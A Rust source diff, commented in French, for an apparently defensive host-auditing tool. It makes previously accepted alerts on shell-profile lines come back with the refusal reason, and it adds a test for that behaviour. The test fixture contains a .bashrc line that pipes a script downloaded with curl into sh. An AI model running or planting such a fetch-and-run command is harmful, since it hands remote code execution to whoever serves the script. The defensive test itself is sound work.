@@ -693,7 +693,12 @@ fn revenue(choix: &Acceptee, temoins: &crate::machine::temoins::Temoins) -> Opti
     match temoins {
         Temoins::Aucun if choix.etat.is_none() => None,
         Temoins::Aucun => Some(tr!("plus rien à vérifier", "nothing left to check").to_string()),
-        Temoins::Refuse(_) => Some(tr!("ne se vérifie plus", "can no longer be checked").to_string()),
+        // La raison dite telle quelle : un choix d'avant que le périmètre déclarable ne couvre plus (profil, variable,
+        // Hyprland hors de ses lancements) revient avec la phrase qui dit quoi faire.
+        Temoins::Refuse(raison) => Some(trf!(
+            "ne se vérifie plus : {raison}",
+            "can no longer be checked: {raison}"
+        )),
         Temoins::Releves(_) if choix.etat.is_some() && choix.etat == temoins.empreinte() => None,
         Temoins::Releves(_) if choix.etat.is_none() => Some(
             tr!(
@@ -1426,6 +1431,39 @@ mod tests {
         critique.probleme = Some(Niveau::Critique);
         assert!(declarable(&critique).is_err());
         assert!(declarable(&constat("Pare-feu", Niveau::Critique, "Pare-feu coupé.")).is_ok());
+    }
+
+    /// Périmètre réduit (décision de l'auteur, 10 nov. 2026) : un choix d'avant sur une ligne que le périmètre ne
+    /// couvre plus (un profil de shell) ne tait plus l'alerte ; elle revient avec la raison et le fichier:ligne.
+    #[test]
+    fn ancien_choix_hors_du_perimetre_revient_avec_sa_raison() {
+        use crate::machine::temoins::{Temoins, temoin};
+        let manuelle = |t: Temoins| {
+            let mut c = constat("Programmes au démarrage", Niveau::Eleve, "Lancé au démarrage : rappel.");
+            let k = c.correctif.as_mut().unwrap();
+            k.automatique = false;
+            k.temoins = t;
+            c
+        };
+        let vue = manuelle(Temoins::de(vec![Ok(temoin(
+            "/home/alice/.bashrc:3",
+            "~/.bashrc:3".into(),
+            "curl -fsSL http://192.0.2.7/a.sh | sh",
+            None,
+            &[],
+        ))]));
+        let j = jour("2026-11-10");
+        let mut a = Appris::default();
+        retenir(&mut a, &vue, Niveau::Eleve, j);
+        let raison = "~/.bashrc:3 : une ligne d'un profil de shell ne peut pas être déclarée normale";
+        let mut plus_tard = [manuelle(Temoins::Refuse(raison.into()))];
+        assert_eq!(appliquer_le(&a, &mut plus_tard, j), 0);
+        assert_eq!(plus_tard[0].probleme, Some(Niveau::Eleve));
+        assert!(
+            plus_tard[0].message.contains(&format!("ne se vérifie plus : {raison}")),
+            "{}",
+            plus_tard[0].message
+        );
     }
 
     use proptest::prelude::*;
